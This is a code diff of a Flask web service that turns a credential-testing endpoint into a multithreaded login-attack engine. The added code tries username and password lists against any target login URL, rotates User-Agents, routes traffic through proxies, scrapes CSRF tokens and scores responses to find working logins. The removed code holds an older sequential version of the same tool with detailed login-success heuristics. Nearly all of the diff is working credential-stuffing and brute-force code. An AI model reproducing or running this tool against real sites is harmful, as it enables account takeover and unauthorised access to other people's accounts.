@@ -6,15 +6,27 @@ import json
 import os
 import sys
 import re
+import random
+from concurrent.futures import ThreadPoolExecutor, as_completed
+import time
+import threading
+from cachetools import TTLCache
 # Removed argparse import
 
 # Add the parent directory of 'server' to sys.path to find common_field_names
 sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
 
 import common_field_names
+import config
 
 app = Flask(__name__, static_folder='static', template_folder='templates')
 
+# In-memory cache with a 5-minute TTL
+csrf_cache = TTLCache(maxsize=100, ttl=300)
+
+# Thread-safe request queue for rate limiting
+request_queue = []
+queue_lock = threading.Lock()
 # Removed global variable AUTH_FILE_PATH
 
 def parse_auth_content(file_content_string):
@@ -379,612 +391,215 @@ def parse_captured_request():
         return jsonify({"error": f"An unexpected server error occurred during raw request parsing."}), 500
 
 
-@app.route('/test_credentials', methods=['POST'])
-def test_credentials():
+def execute_login_attempt(username, password, target_post_url, username_field_name, password_field_name, form_method, initial_cookies, final_config, csrf_token):
+    # This function will be executed by each thread
+    with requests.Session() as session:
+        if initial_cookies:
+            session.cookies.update(initial_cookies)
+
+        # User-Agent Rotation
+        user_agent = random.choice(final_config["user_agents"])
+        headers = {
+            'User-Agent': user_agent,
+            'Origin': urlparse(target_post_url).scheme + '://' + urlparse(target_post_url).netloc,
+            'Referer': target_post_url
+        }
+
+        # Proxy Support
+        proxies = {"http": final_config["proxy"], "https": final_config["proxy"]} if final_config["proxy"] else None
+
+        payload = {
+            username_field_name: username,
+            password_field_name: password
+        }
+
+        if csrf_token:
+            payload[csrf_token['name']] = csrf_token['value']
+
+        try:
+            # Rate Limiting
+            if final_config["requests_per_minute"]:
+                delay = 60.0 / final_config["requests_per_minute"]
+                with queue_lock:
+                    request_queue.append(time.time())
+                    while len(request_queue) > 1 and (request_queue[-1] - request_queue[0]) > 60:
+                        request_queue.pop(0)
+                    if len(request_queue) > final_config["requests_per_minute"]:
+                        time.sleep(delay)
+
+            if form_method == 'POST':
+                response = session.post(target_post_url, data=payload, headers=headers, proxies=proxies, timeout=10, allow_redirects=True)
+            else: # GET
+                response = session.get(target_post_url, params=payload, headers=headers, proxies=proxies, timeout=10, allow_redirects=True)
+
+            # Advanced Heuristics
+            heuristics = final_config["heuristics"]
+            status = "unknown"
+            details = ""
+
+            # Check for 2FA/MFA first
+            if any(keyword in response.text.lower() for keyword in ["2fa", "two-factor", "mfa", "multi-factor"]):
+                status = "2fa_required"
+                details = "Landed on 2FA/MFA page."
+
+            # Success Heuristics
+            if status == "unknown":
+                if response.status_code in heuristics.get("success_status_codes", []):
+                    status = "success"
+                    details = f"Success status code: {response.status_code}"
+                for header, value in heuristics.get("success_headers", {}).items():
+                    if header in response.headers and value in response.headers[header]:
+                        status = "success"
+                        details = f"Success header found: {header}: {response.headers[header]}"
+                        break
+                try:
+                    json_response = response.json()
+                    for key, value in heuristics.get("success_json", {}).items():
+                        if json_response.get(key) == value:
+                            status = "success"
+                            details = f"Success JSON response: {key}: {value}"
+                            break
+                except ValueError:
+                    pass # Not a JSON response
+
+            # Failure Heuristics
+            if status == "unknown":
+                if response.status_code in heuristics.get("failure_status_codes", []):
+                    status = "failure"
+                    details = f"Failure status code: {response.status_code}"
+                for keyword in heuristics.get("failure_body_keywords", []):
+                    if keyword in response.text.lower():
+                        status = "failure"
+                        details = f"Failure keyword found: {keyword}"
+                        break
+
+            return {
+                "username": username,
+                "password_actual": password,
+                "status": status,
+                "details": details,
+                "response_url": response.url,
+                "status_code": response.status_code,
+                "content_length": len(response.text)
+            }
+
+        except requests.exceptions.RequestException as e:
+            return {
+                "username": username,
+                "password": password,
+                "status": "error",
+                "details": str(e)
+            }
+
+@app.route('/test_credentials_stream', methods=['POST'])
+def test_credentials_stream():
     app.logger.info(f"Received request for {request.path} from {request.remote_addr}")
     log_payload_summary = {}
     if request.is_json:
         json_data = request.get_json()
-        log_payload_summary = {k: v for k, v in json_data.items() if k not in ['username_list', 'password_list']}
+        log_payload_summary = {k: v for k, v in json_data.items() if k not in ['username_list', 'password_list', 'auth_file_content']}
         log_payload_summary['username_list_count'] = len(json_data.get('username_list', []))
         log_payload_summary['password_list_count'] = len(json_data.get('password_list', []))
+        log_payload_summary['has_auth_file'] = 'auth_file_content' in json_data and bool(json_data['auth_file_content'])
         app.logger.debug(f"Request JSON payload summary: {log_payload_summary}")
 
     try:
         data = request.get_json()
-        required_fields = [
-            "target_post_url", "username_field_name", "password_field_name",
-            "username_list", "password_list", "form_method"
-        ]
+        required_fields = ["target_post_url", "username_field_name", "password_field_name", "form_method"]
         if not data or not all(field in data for field in required_fields):
             missing = [field for field in required_fields if field not in data]
-            app.logger.warning(f"Missing required fields in /test_credentials from {request.remote_addr}: {', '.join(missing)}")
-            return jsonify({"error": f"Missing required fields in request payload: {', '.join(missing)}"}), 400
+            app.logger.warning(f"Missing required fields in /test_credentials_stream from {request.remote_addr}: {', '.join(missing)}")
+            return jsonify({"error": f"Missing required fields: {', '.join(missing)}"}), 400
 
+        # --- Configuration Merging ---
+        req_config = data.get('config', {})
+        final_config = {
+            "requests_per_minute": req_config.get("requests_per_minute", config.DEFAULT_REQUESTS_PER_MINUTE),
+            "user_agents": req_config.get("user_agents", config.DEFAULT_USER_AGENTS),
+            "proxy": req_config.get("proxy", config.DEFAULT_PROXY),
+            "heuristics": {**config.DEFAULT_HEURISTICS, **req_config.get("heuristics", {})},
+            "login_page_url": req_config.get("login_page_url", data['target_post_url']),
+            "csrf_token_field_name": req_config.get("csrf_token_field_name") # Can be None
+        }
+
+        # --- Credential Parsing ---
+        username_list_payload = data.get('username_list', [])
+        password_list_payload = data.get('password_list', [])
+        auth_file_content = data.get('auth_file_content')
+
+        if not isinstance(username_list_payload, list) or not isinstance(password_list_payload, list):
+            return jsonify({"error": "'username_list' and 'password_list' must be lists."}), 400
+
+        source_usernames = []
+        source_passwords = []
+        credential_source_message = ""
+
+        if auth_file_content:
+            parsed_credentials = parse_auth_content(auth_file_content)
+            if parsed_credentials:
+                source_usernames = [cred[0] for cred in parsed_credentials]
+                source_passwords = [cred[1] for cred in parsed_credentials]
+                credential_source_message = f"Using {len(source_usernames)} credential pairs from uploaded content."
+            else:
+                credential_source_message = "Uploaded auth content was empty/invalid. Falling back to lists."
+
+        if not source_usernames: # Fallback if auth content was not provided, empty, or invalid
+            source_usernames = username_list_payload
+            source_passwords = password_list_payload
+            if not credential_source_message: # If message wasn't set by failed auth file parse
+                credential_source_message = f"Using {len(source_usernames)} credential pairs from individual lists."
+
+        num_pairs_to_test = min(len(source_usernames), len(source_passwords))
+        if num_pairs_to_test == 0:
+            return jsonify({"error": "No valid credential pairs to test."}), 400
+
+        # --- Other Payload Details ---
         target_post_url = data['target_post_url']
         username_field_name = data['username_field_name']
         password_field_name = data['password_field_name']
-        username_list_payload = data['username_list'] # Renamed to avoid conflict with function-scoped var
-        password_list_payload = data['password_list'] # Renamed
         form_method = data.get('form_method', 'POST').upper()
-        auth_file_content = data.get('auth_file_content')
-
-        # Defer strict validation of username_list_payload and password_list_payload
-        # until after we check auth_file_content.
-        # Basic type checks can remain if desired, but emptiness check is key.
-        if not isinstance(username_list_payload, list):
-            app.logger.warning(f"'username_list' from payload is not a list in /test_credentials from {request.remote_addr}")
-            return jsonify({"error": "'username_list' (from payload) must be a list."}), 400
-        if not isinstance(password_list_payload, list):
-            app.logger.warning(f"'password_list' from payload is not a list in /test_credentials from {request.remote_addr}")
-            return jsonify({"error": "'password_list' (from payload) must be a list."}), 400
-
-        csrf_token_name = data.get('csrf_token_name')
-        csrf_token_value = data.get('csrf_token_value')
         initial_cookies = data.get('cookies', {})
 
         def event_stream():
-            source_usernames = []
-            source_passwords = []
-            credential_source_message = ""
-            has_valid_auth_content = False
-
-            if auth_file_content:
-                app.logger.info("Auth file content provided in payload. Attempting to parse.")
-                parsed_credentials = parse_auth_content(auth_file_content)
-                if parsed_credentials:
-                    source_usernames = [cred[0] for cred in parsed_credentials]
-                    source_passwords = [cred[1] for cred in parsed_credentials]
-                    credential_source_message = f"Using {len(source_usernames)} credential pairs from uploaded auth content."
-                    has_valid_auth_content = True
+            # Dynamic CSRF Token Fetching
+            csrf_token = None
+            if final_config["csrf_token_field_name"]:
+                cache_key = f"csrf:{final_config['login_page_url']}"
+                cached_token = csrf_cache.get(cache_key)
+                if cached_token:
+                    csrf_token = cached_token
                 else:
-                    app.logger.warning("Auth file content provided but was empty/invalid.")
-                    # Message will indicate fallback below if this path is taken
-
-            if not has_valid_auth_content:
-                source_usernames = username_list_payload
-                source_passwords = password_list_payload
-
-                if auth_file_content: # Implies it was present but invalid/empty from parse_auth_content
-                    credential_source_message = f"Uploaded auth content empty/invalid. Using {len(source_usernames)} credential pairs from individual payload lists."
-                else: # No auth_file_content was ever provided
-                    credential_source_message = f"No auth file content provided. Using {len(source_usernames)} credential pairs from individual payload lists."
-
-                # If, after all this, both lists are empty, it means no usable credentials from any source.
-                if not source_usernames and not source_passwords:
-                    credential_source_message = "No valid credentials provided from any source."
-
-            # Logging without request.remote_addr in the loop for these specific messages
-            if not has_valid_auth_content: # Only log these if we fell back to payload lists
-                if not username_list_payload:
-                    app.logger.warning("Username list (from payload) is empty.")
-                if not password_list_payload:
-                    app.logger.warning("Password list (from payload) is empty.")
-
-            app.logger.info(f"Final credential source message: {credential_source_message}")
-            num_pairs_to_test = min(len(source_usernames), len(source_passwords))
-
-            # If after all checks, there are no pairs to test (e.g. one list is empty),
-            # the existing num_pairs_to_test == 0 check in the stream will handle it.
-            # We only error out early if basic payload structure is wrong (e.g. username_list not a list).
+                    try:
+                        session = requests.Session()
+                        response = session.get(final_config["login_page_url"], headers={'User-Agent': random.choice(final_config["user_agents"])}, timeout=10)
+                        soup = BeautifulSoup(response.text, 'html.parser')
+                        token_input = soup.find('input', {'name': final_config["csrf_token_field_name"]})
+                        if token_input:
+                            csrf_token = {"name": final_config["csrf_token_field_name"], "value": token_input.get('value')}
+                            csrf_cache[cache_key] = csrf_token
+                    except requests.exceptions.RequestException as e:
+                        app.logger.error(f"Error fetching CSRF token: {e}")
 
             initial_info = {
                 "type": "info",
                 "total_expected_attempts": num_pairs_to_test,
                 "message": f"Test run initiated. {credential_source_message} Expecting {num_pairs_to_test} pairs to be tested."
             }
-            app.logger.info(f"SSE stream: Sending initial info event: {initial_info}")
             yield f"data: {json.dumps(initial_info)}\n\n"
 
-            common_error_messages = [
-                "incorrect password", "invalid password", "login failed", "login failure",
-                "wrong credentials", "authentication failed", "invalid username or password",
-                "username or password incorrect", "user not found", "account locked",
-                "too many attempts", "session expired", "login error", "access denied",
-                "unauthorized", "kullanıcı adı veya şifre hatalı", "e-posta veya şifre yanlış"
-            ]
-            common_success_keywords = [
-                "welcome", "dashboard", "my account", "logout", "sign out",
-                "settings", "profile", "control panel", "logged in as", "sign off"
-            ]
+            with ThreadPoolExecutor(max_workers=10) as executor:
+                futures = [executor.submit(execute_login_attempt, source_usernames[i], source_passwords[i], target_post_url, username_field_name, password_field_name, form_method, initial_cookies, final_config, csrf_token) for i in range(num_pairs_to_test)]
+                for future in as_completed(futures):
+                    result = future.result()
+                    yield f"data: {json.dumps(result)}\n\n"
 
-            # Headers are mostly constant for all attempts in this run
-            base_headers = {
-                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
-                'Origin': urlparse(target_post_url).scheme + '://' + urlparse(target_post_url).netloc if target_post_url.startswith('http') else None,
-                'Referer': target_post_url
-            }
-            if base_headers['Origin'] is None:
-                del base_headers['Origin'] # Remove if not applicable
-
-            app.logger.info(f"SSE stream: Starting paired credential testing. Number of pairs to test: {num_pairs_to_test}")
-            if num_pairs_to_test == 0:
-                yield f"data: {json.dumps({'status': 'complete', 'message': 'No username/password pairs to test.'})}\n\n"
-                app.logger.info("SSE stream: No pairs to test, sending completion event early.")
-                return
-
-            for i in range(num_pairs_to_test):
-                # Create a new session for each attempt to ensure isolation
-                with requests.Session() as session:
-                    if initial_cookies:
-                        session.cookies.update(initial_cookies)
-
-                    # Use a copy of base_headers for this specific attempt if needed, though usually not modified per attempt
-                    current_headers = base_headers.copy()
-
-                    username_attempt = source_usernames[i]
-                    password_attempt = source_passwords[i]
-
-                    app.logger.info(f"SSE stream: Attempting pair {i+1}/{num_pairs_to_test}: User '{username_attempt}' with Password '********'")
-
-                    # --- BEGIN: Fetch fresh CSRF token for this attempt ---
-                    fresh_csrf_token_name = None
-                    fresh_csrf_token_value = None
-                    login_page_url_for_csrf = target_post_url # Assume target_post_url is the login page
-
-                    try:
-                        app.logger.info(f"Fetching login page ({login_page_url_for_csrf}) for fresh CSRF token for user {username_attempt}")
-                        login_page_resp = session.get(login_page_url_for_csrf, headers=current_headers, timeout=10, allow_redirects=True)
-                        login_page_resp.raise_for_status()
-                        login_soup = BeautifulSoup(login_page_resp.text, 'html.parser')
-
-                        # Try to find CSRF in forms (similar to analyze_url)
-                        # Simplified: look for any form and then hidden inputs within it.
-                        # A more robust approach would re-use the more detailed form finding from analyze_url if needed.
-                        forms_on_page = login_soup.find_all('form')
-                        for form_in_login_page in forms_on_page:
-                            hidden_inputs = form_in_login_page.find_all('input', {'type': 'hidden'})
-                            for hidden_in in hidden_inputs:
-                                input_name = hidden_in.get('name')
-                                if input_name:
-                                    for common_csrf_name_candidate in common_field_names.COMMON_CSRF_TOKEN_FIELDS:
-                                        if common_csrf_name_candidate.lower() == input_name.lower():
-                                            fresh_csrf_token_name = input_name
-                                            fresh_csrf_token_value = hidden_in.get('value')
-                                            app.logger.info(f"Found fresh CSRF for attempt: name='{fresh_csrf_token_name}', value='{fresh_csrf_token_value}'")
-                                            break
-                                if fresh_csrf_token_name:
-                                    break
-                            if fresh_csrf_token_name:
-                                break
-                        if not fresh_csrf_token_name:
-                             app.logger.warning(f"Could not find a fresh CSRF token on {login_page_url_for_csrf} for user {username_attempt}. Will use initial if available.")
-                    except Exception as e_csrf:
-                        app.logger.warning(f"Error fetching/parsing login page for fresh CSRF for user {username_attempt}: {str(e_csrf)}")
-                    # --- END: Fetch fresh CSRF token ---
-
-                    current_payload_for_request = {
-                        username_field_name: username_attempt,
-                        password_field_name: password_attempt,
-                    }
-
-                    # Use fresh CSRF token if found, otherwise fallback to initially analyzed one
-                    if fresh_csrf_token_name and fresh_csrf_token_value:
-                        current_payload_for_request[fresh_csrf_token_name] = fresh_csrf_token_value
-                        app.logger.info(f"Using fresh CSRF for attempt: {fresh_csrf_token_name}")
-                    elif csrf_token_name and csrf_token_value: # Fallback to original
-                        current_payload_for_request[csrf_token_name] = csrf_token_value
-                        app.logger.info(f"Using initial CSRF for attempt (fresh not found): {csrf_token_name}")
-                    else:
-                        app.logger.info("No CSRF token used for this attempt (none found initially or freshly).")
-
-
-                    attempt_result = {
-                        "username": username_attempt,
-                        "password_actual": password_attempt, # For client-side reference if needed
-                        "status": "unknown",
-                        "response_url": None,
-                        "status_code": None,
-                        "content_length": None,
-                        "request_details": current_payload_for_request.copy(), # Log what was sent
-                        "response_body": None, # Store response for modal
-                        "details": "" # Summary of analysis
-                    }
-
-                    try:
-                        # The 'session' object is new for this attempt.
-                        # 'initial_cookies' were applied to it if they existed.
-                        # So, the state of session.cookies BEFORE the request is effectively 'initial_cookies'.
-
-                        # Make the request
-                        if form_method == 'POST':
-                            response = session.post(target_post_url, data=current_payload_for_request, headers=current_headers, timeout=10, allow_redirects=True)
-                        elif form_method == 'GET':
-                            response = session.get(target_post_url, params=current_payload_for_request, headers=current_headers, timeout=10, allow_redirects=True)
-                        else:
-                            attempt_result["status"] = "error"
-                            attempt_result["details"] = f"Unsupported form method: {form_method}"
-                            yield f"data: {json.dumps(attempt_result)}\n\n"
-                            continue
-
-                        # After the request, session.cookies contains post-request cookies.
-                        # initial_cookies (passed to event_stream) is the pre-request state for this attempt's session.
-
-                        attempt_result["status_code"] = response.status_code
-                        attempt_result["response_url"] = response.url
-
-                        response_text_content = ""
-                        try:
-                            response_text_content = response.text
-                            # content_length should be from the actual response, not potentially truncated version
-                            attempt_result["content_length"] = len(response_text_content)
-
-                            MAX_SSE_RESPONSE_BODY_LEN = 15000 # Max characters for response_body in SSE
-                            if len(response_text_content) > MAX_SSE_RESPONSE_BODY_LEN:
-                                attempt_result["response_body"] = response_text_content[:MAX_SSE_RESPONSE_BODY_LEN] + "... (truncated for SSE)"
-                                app.logger.warning(
-                                    f"Response body for {username_attempt} was truncated for SSE. Original length: {len(response_text_content)}, Sent: {MAX_SSE_RESPONSE_BODY_LEN}"
-                                )
-                            else:
-                                attempt_result["response_body"] = response_text_content
-
-                        except Exception as e_text_body:
-                            app.logger.warning(f"Could not get response.text for response_body for user {username_attempt}: {e_text_body}")
-                            attempt_result["response_body"] = f"Error retrieving response body: {str(e_text_body)}"
-                            attempt_result["content_length"] = -1 # Indicate error or unknown length
-                            header_cl = response.headers.get('Content-Length')
-                            if header_cl and header_cl.isdigit():
-                                attempt_result["content_length"] = int(header_cl)
-                            else:
-                                attempt_result["content_length"] = -1
-
-                        # Initialize analysis variables
-                        login_score = 0
-                        positive_indicators = []
-                        negative_indicators = []
-                        soup = BeautifulSoup(response.text, 'html.parser')
-                        response_text_lower = response.text.lower()
-                        original_response_length = len(response.text)
-
-                        # --- CORRECTED ORDER ---
-                        # 1. Perform URL parsing and redirect analysis first.
-                        parsed_target_post_url = urlparse(target_post_url)
-                        parsed_response_url = urlparse(response.url)
-                        is_redirected = len(response.history) > 0
-                        is_redirected_significantly = False
-                        if is_redirected:
-                            if parsed_target_post_url.netloc != parsed_response_url.netloc:
-                                is_redirected_significantly = True
-                            else:
-                                target_path_segment = (parsed_target_post_url.path.split('/')[1] if parsed_target_post_url.path.count('/') > 1 else parsed_target_post_url.path).lower()
-                                response_path_segment = (parsed_response_url.path.split('/')[1] if parsed_response_url.path.count('/') > 1 else parsed_response_url.path).lower()
-                                common_login_paths = ['login', 'signin', 'auth', 'account', 'authenticate']
-                                if any(lp in target_path_segment for lp in common_login_paths) and not any(lp in response_path_segment for lp in common_login_paths):
-                                    is_redirected_significantly = True
-                                elif target_path_segment != response_path_segment and parsed_target_post_url.path != parsed_response_url.path :
-                                    is_redirected_significantly = True
-
-                        # 2. Define is_on_known_success_page using the now-defined redirect variables.
-                        is_on_known_success_page = (is_redirected_significantly and parsed_response_url.path.endswith('/frontend/rest/v1/welcome'))
-
-                        # 3. Apply scoring for redirects (C1 Scoring part)
-                        if is_on_known_success_page:
-                            login_score += 70
-                            positive_indicators.append(f"Redirected to known success URL: '{parsed_response_url.path}'")
-                        elif is_redirected_significantly:
-                            login_score += 40
-                            positive_indicators.append(f"Significant URL redirection from '{parsed_target_post_url.path}' to '{parsed_response_url.path}'")
-                        elif is_redirected:
-                            login_score += 5
-                            positive_indicators.append(f"Minor URL redirection to '{parsed_response_url.path}'")
-                        # --- END OF REDIRECT ANALYSIS AND SCORING ---
-
-                        # Now proceed with other checks (A, B, remaining C, D categories)
-                        # Category A: Definitive Failure Indicators
-                        # A1: Check for Explicit Error Messages
-                        detailed_error_messages = common_error_messages + [
-                            "invalid login attempt", "please try again", "check your credentials",
-                            "account disabled", "contact support", "kullanıcı bulunamadı",
-                            "şifre yanlış", "hesap kilitli", "doğrulama kodu hatalı",
-                            "güvenlik resmi yanlış", "captcha validation failed",
-                            "csrf token mismatch", "token expired", "forbidden", "access denied"
-                        ]
-                        found_error_message_text = None
-                        for err_msg in detailed_error_messages:
-                            if err_msg in response_text_lower:
-                                found_error_message_text = err_msg
-                                break
-                        if found_error_message_text:
-                            login_score -= 100
-                            negative_indicators.append(f"Found explicit error text: '{found_error_message_text}'")
-
-                        # A2: Check for Login Form Persistence (Password Field)
-                        if password_field_name and soup.find('input', {'name': password_field_name}):
-                            login_score -= 75
-                            negative_indicators.append(f"Login form (password field '{password_field_name}') is still present")
-                        elif soup.find('input', {'type': 'password'}):
-                            login_score -= 60
-                            negative_indicators.append("Login form (generic password field) is still present")
-
-                        # A3: Check for CAPTCHA
-                        captcha_keywords = ["captcha", "i'm not a robot", "g-recaptcha", "recaptcha", "security check", "are you human"]
-                        captcha_elements_selectors = [
-                            {'class': 'g-recaptcha'},
-                            {'id': lambda x: x and 'captcha' in x.lower()},
-                            {'name': lambda x: x and 'captcha' in x.lower()}
-                        ]
-                        found_captcha_keyword = any(kw in response_text_lower for kw in captcha_keywords)
-                        found_captcha_element = any(soup.find(attrs=selector) for selector in captcha_elements_selectors)
-
-                        # is_on_known_success_page is already defined
-                        if found_captcha_keyword or found_captcha_element:
-                            if is_on_known_success_page: # If we are on success page, CAPTCHA (from prev page) is less of a failure indicator
-                                login_score -= 10
-                                negative_indicators.append("CAPTCHA elements/keywords detected (possibly on intermediate page, but landed on welcome)")
-                            else: # If not on success page and CAPTCHA found, it's a strong failure signal
-                                login_score -= 100
-                                negative_indicators.append("CAPTCHA challenge detected on page")
-
-                        # A4: Check for Critical HTTP Error Codes
-                        if response.status_code in [401, 403, 429]:
-                            login_score -= 100
-                            negative_indicators.append(f"Received critical HTTP error code: {response.status_code}")
-                        elif response.status_code >= 400 and response.status_code < 500:
-                            login_score -= 40
-                            negative_indicators.append(f"Received client-side HTTP error code: {response.status_code}")
-
-                        # Category B: Definitive Success Indicators
-                        # B1: Check for Definitive Post-Login Elements
-                        post_login_selectors = [
-                            {'href': lambda href: href and ('logout' in href.lower() or 'signout' in href.lower() or 'logoff' in href.lower())},
-                            {'id': lambda x: x and ('dashboard' in x.lower() or 'user-profile' in x.lower() or 'account-settings' in x.lower())},
-                            {'class': lambda x: x and any(c in x.lower() for c in ['user-menu', 'profile-dropdown', 'site-header-actions--logged-in'])},
-                            {'aria-label': lambda x: x and ('logout' in x.lower() or 'profile' in x.lower())},
-                        ]
-                        found_post_login_element_detail = None
-                        for selector_type in post_login_selectors:
-                            if isinstance(selector_type, dict):
-                                found_element = soup.find(attrs=selector_type)
-                                if found_element:
-                                    found_post_login_element_detail = f"Found element matching {selector_type}"
-                                    break
-                        if found_post_login_element_detail:
-                            login_score += 80
-                            positive_indicators.append(f"Found definitive post-login element ({found_post_login_element_detail})")
-
-                        # B2: Check for User-Specific Information (Expected Username)
-                        if username_attempt and username_attempt.lower() in response_text_lower:
-                            is_in_input_value = False
-                            for input_tag in soup.find_all('input'):
-                                if input_tag.get('value', '').lower() == username_attempt.lower():
-                                    is_in_input_value = True
-                                    break
-                            if not is_in_input_value:
-                                login_score += 70
-                                positive_indicators.append(f"Expected username '{username_attempt}' found in page body (not as input value)")
-                            else:
-                                login_score -= 10
-                                negative_indicators.append(f"Expected username '{username_attempt}' found, but only in an input field value (potential prefill on failure)")
-
-                        # Category C: Strong Corroborating Indicators (C1 was moved up)
-                        # C2: Check for Changed Cookies
-                        pre_request_cookies_dict = initial_cookies.copy() if initial_cookies else {}
-                        post_request_cookies_dict = session.cookies.get_dict()
-                        cookies_changed = False
-
-                        if len(post_request_cookies_dict) != len(pre_request_cookies_dict):
-                            cookies_changed = True
-                        else:
-                            for k, v in post_request_cookies_dict.items():
-                                if k not in pre_request_cookies_dict or pre_request_cookies_dict[k] != v:
-                                    cookies_changed = True
-                                    break
-
-                        if cookies_changed:
-                            app.logger.info(f"SSE stream: Cookies changed for user {username_attempt} (pass: ****). Before: {len(pre_request_cookies_dict)} keys, After: {len(post_request_cookies_dict)} keys. Pre: {pre_request_cookies_dict}, Post: {post_request_cookies_dict}")
-                            login_score += 25
-                            positive_indicators.append("Session cookies were set or changed")
-
-                        # C3: Check for Absence of Login Form (Password Field)
-                        # This is the inverse of A2. More reliable if specific password_field_name is NOT found.
-                        if password_field_name and not soup.find('input', {'name': password_field_name}) and not soup.find('input', {'type': 'password'}):
-                            login_score += 20
-                            positive_indicators.append(f"Login form (password field '{password_field_name}' or generic) is no longer present")
-                        elif not soup.find('input', {'type': 'password'}): # Generic check
-                            login_score += 15 # Slightly less if only generic check passes
-                            positive_indicators.append("Login form (generic password field) is no longer present")
-
-                        # C4: Check for "Soft" Failure URL
-                        soft_failure_url_patterns = ["error=", "login_failed=", "failure=", "denied=", "auth_error="]
-                        if any(pattern in response.url.lower() for pattern in soft_failure_url_patterns):
-                            login_score -= 30
-                            negative_indicators.append(f"URL '{response.url}' contains failure parameters")
-
-                        # C5: Check for Success Keywords in Body/URL
-                        # Using a refined list of success keywords
-                        refined_success_keywords = [
-                            "welcome back", "successfully logged in", "dashboard overview",
-                            "my profile", "account settings", "control panel access", "manage account",
-                            "logout", "sign out" # Be careful with "logout" if not tied to a link element
-                        ]
-                        if any(kw in response_text_lower for kw in refined_success_keywords) or \
-                           any(kw in response.url.lower() for kw in refined_success_keywords):
-                            login_score += 15
-                            positive_indicators.append("Found success-associated keyword in body/URL")
-
-                        # C6: Check for HTTP 200 OK on POST URL (potential soft failure)
-                        # This means the page might have just reloaded with an error message not caught by A1.
-                        if response.status_code == 200 and response.url == target_post_url and not is_redirected:
-                            login_score -= 20
-                            negative_indicators.append("Page reloaded with 200 OK (same URL as POST), indicating probable soft failure (no redirect)")
-
-
-                        # Category D: Contextual & Minor Indicators
-                        # D1: Check for Page Title Change
-                        # This requires knowing the original page title. For now, we can check if the title
-                        # seems like a "non-login" title.
-                        title_tag = soup.find('title')
-                        if title_tag:
-                            page_title_lower = title_tag.get_text(strip=True).lower()
-                            login_related_titles = ["login", "log in", "sign in", "signin", "authenticate", "access"]
-                            dashboard_related_titles = ["dashboard", "my account", "profile", "settings", "welcome"]
-                            if any(dt in page_title_lower for dt in dashboard_related_titles) and \
-                               not any(lt in page_title_lower for lt in login_related_titles):
-                                login_score += 10
-                                positive_indicators.append(f"Page title changed to '{page_title_lower}', suggesting success")
-                            elif any(lt in page_title_lower for lt in login_related_titles) and not found_error_message_text and not soup.find('input', {'type': 'password'}):
-                                # Title still says login, but form is gone and no error, could be intermediate step or odd success
-                                login_score += 5
-                                positive_indicators.append(f"Page title ('{page_title_lower}') still login-related, but form gone and no errors.")
-                            elif any(lt in page_title_lower for lt in login_related_titles) and (found_error_message_text or soup.find('input', {'type': 'password'})):
-                                login_score -=5
-                                negative_indicators.append(f"Page title ('{page_title_lower}') remains login-related with other failure signs.")
-
-
-                        # D2: Check for Increased Response Size
-                        # This is tricky without a baseline. A very small response after login might be an error.
-                        # A significantly larger one might be a dashboard.
-                        # Let's assume a "typical" error page is < 5KB and a dashboard > 10KB. This is highly speculative.
-                        current_response_length = len(response.text)
-                        if current_response_length > 10000 and not found_error_message_text: # > 10KB and no obvious error
-                            login_score += 10
-                            positive_indicators.append(f"Response size ({current_response_length} bytes) is relatively large, may indicate a content-rich page (e.g., dashboard)")
-                        elif current_response_length < 2000 and not is_redirected_significantly : # < 2KB and not a significant redirect (could be a small success confirmation)
-                            # If it's very small but we have other strong success signals, it might be ok (e.g. API success message)
-                            # If it's small and we have failure signals, it reinforces failure.
-                            # This check alone is weak.
-                            pass # Avoid penalizing too much for small size alone if other indicators are mixed.
-
-                        # D3: Check for Input Field Error Classes
-                        error_input_classes = ["input-error", "field-error", "has-error", "is-invalid"]
-                        found_error_class = False
-                        for input_tag in soup.find_all('input'):
-                            input_classes = input_tag.get('class', [])
-                            if any(err_cls in input_classes for err_cls in error_input_classes):
-                                found_error_class = True
-                                break
-                        if found_error_class:
-                            login_score -= 15
-                            negative_indicators.append("Found CSS error classes on input fields")
-
-                        # D4: Check for Redirect Loop
-                        if len(response.history) > 10: # requests default max_redirects is 30
-                            login_score -= 50
-                            negative_indicators.append(f"Potential redirect loop detected ({len(response.history)} redirects)")
-
-                        # D5: Check for API-Driven Login (JSON response)
-                        try:
-                            json_response = response.json()
-                            if isinstance(json_response, dict):
-                                # Check for success patterns
-                                if json_response.get('success') is True or \
-                                   json_response.get('status','').lower() == 'success' or \
-                                   any(k in json_response for k in ['token', 'session_id', 'auth_token', 'jwt']):
-                                    login_score += 90
-                                    positive_indicators.append("API success response detected (e.g., success:true or token found)")
-                                # Check for failure patterns
-                                elif json_response.get('success') is False or \
-                                     any(k in json_response for k in ['error', 'errors', 'message']) or \
-                                     json_response.get('status','').lower() in ['fail', 'failure', 'error'] :
-
-                                    error_message_from_json = json_response.get('error') or json_response.get('message') or json.dumps(json_response.get('errors'))
-                                    login_score -= 90
-                                    negative_indicators.append(f"API failure response detected (e.g., success:false or error message: {error_message_from_json})")
-                                else:
-                                    # Neutral JSON response, not clearly success or failure by common patterns
-                                    login_score += 0 # No change, needs other indicators
-                                    positive_indicators.append("JSON response received, structure not indicative of immediate success/failure")
-                        except json.JSONDecodeError:
-                            # Not a JSON response, this check doesn't apply
-                            pass
-
-
-                        # D6: Check for 2FA/MFA Prompt
-                        mfa_keywords = ["two-factor", "2fa", "mfa", "multi-factor", "verification code", "authenticator app", "security code", "enter code"]
-                        if any(kw in response_text_lower for kw in mfa_keywords):
-                            login_score += 30 # Partial success, but needs more action
-                            positive_indicators.append("2FA/MFA prompt detected. User authenticated, needs second factor.")
-                            # Optionally, could set a specific status here like "needs_2fa" if score is ambiguous.
-
-                        # D7: Check for Welcome Message Specificity
-                        welcome_messages_generic = ["welcome", "hello"]
-                        welcome_messages_user_specific_pattern = rf"(welcome|hello|hi)[\s,]+{re.escape(username_attempt)}[!\.]?" if username_attempt else None
-
-                        found_generic_welcome = any(f" {wm} " in response_text_lower or f"{wm}!" in response_text_lower for wm in welcome_messages_generic)
-                        found_specific_welcome = False
-                        if welcome_messages_user_specific_pattern:
-                             if re.search(welcome_messages_user_specific_pattern, response_text_lower, re.IGNORECASE):
-                                found_specific_welcome = True
-
-                        if found_specific_welcome:
-                            login_score += 50
-                            positive_indicators.append(f"Specific welcome message found for user '{username_attempt}'")
